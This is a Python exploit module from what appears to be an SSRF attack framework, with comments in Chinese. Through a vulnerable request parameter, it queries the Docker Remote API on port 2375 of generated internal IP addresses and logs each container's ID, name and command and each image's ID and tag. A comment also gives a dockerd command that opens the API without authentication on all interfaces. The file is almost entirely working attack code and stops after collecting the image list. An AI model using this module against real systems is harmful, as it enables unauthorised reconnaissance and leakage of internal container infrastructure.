import json
import logging
import urllib.parse

from core.utils import *

# 注意
# 使用以下命令启用 Remote API
# /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock

name = "docker"
description = "通过开放的 Docker API 泄露 Docker 信息"
author = "Swissky"
documentation = []


class exploit:
    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")
        gen_host = gen_ip_list("127.0.0.1", args.level)
        port = "2375"

        for ip in gen_host:
            # 第 1 步 - 提取每个容器的 id 和名称
            data = "containers/json"
            payload = wrapper_http(data, ip, port)
            r = requester.do_request(args.param, payload)

            if r.json:
                for container in r.json():
                    container_id = container["Id"]
                    container_name = container["Names"][0].replace("/", "")
                    container_command = container["Command"]

                    logging.info("发现 Docker 容器")
                    logging.info(f"\033[32mID\033[0m : {container_id}")
                    logging.info(f"\033[32m名称\033[0m : {container_name}")
                    logging.info(f"\033[32m命令\033[0m : {container_command}\n")

            # 第 2 步 - 提取每个镜像的 id 和名称
            data = "images/json"
            payload = wrapper_http(data, ip, port)
            r = requester.do_request(args.param, payload)

            if r.json:
                images = {}
                for index, container in enumerate(r.json()):
                    container_id = container["Id"]
                    container_name = container["RepoTags"][0].replace("/", "")

                    logging.info(f"发现第 {index} 个 Docker 镜像")
                    logging.info(f"\033[32mID\033[0m : {container_id}")
                    logging.info(f"\033[32m名称\033[0m : {container_name}\n")
                    images[container_name] = container_id
